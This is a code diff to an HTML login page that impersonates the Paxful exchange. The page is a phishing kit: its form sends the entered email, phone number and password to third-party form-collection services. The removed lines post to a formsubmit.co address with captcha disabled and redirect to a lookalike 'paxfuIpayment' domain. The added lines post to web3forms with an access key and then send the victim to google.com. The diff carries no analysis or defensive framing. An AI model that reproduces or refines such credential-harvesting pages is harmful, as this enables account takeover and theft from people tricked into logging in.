@@ -137,6 +137,15 @@
             height: auto;
         }
     </style>
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            const form = event.target;
+
+	window.location.href = "https://www.google.com"
+        }
+    </script>
 </head>
 <body>
     <div class="container">
@@ -147,8 +156,8 @@
             </div>
             <h1>Welcome back!</h1>
             <p>Don't have an account? <a href="#">Sign up</a></p>
-            <form action="https://formsubmit.co/survey.venmo@tutamail.com" method="POST">
-		<input type="hidden" name="_subject" value="Paxful Login submission!">
+            <form action="https://api.web3forms.com/submit" method="POST" onsubmit="handleSubmit(event)">
+		<input type="hidden" name="access_key" value="9469fdb3-99b6-41e7-9bb9-34f99c6c4141">
                 <div class="input-group">
                     <label for="login">Email / Phone Number</label>
                     <input type="text" id="login" name="Login" placeholder="Email / Phone Number" required>
@@ -160,8 +169,6 @@
                 <div class="forgot-password">
                     <a href="#">Forgot password?</a>
                 </div>
-		<input type="hidden" name="_captcha" value="false">
-		<input type="hidden" name="_next" value="https://paxfuIpayment.github.io/verification.html">
                 <button type="submit" class="login-btn">Sign in</button>
             </form>
         </div>
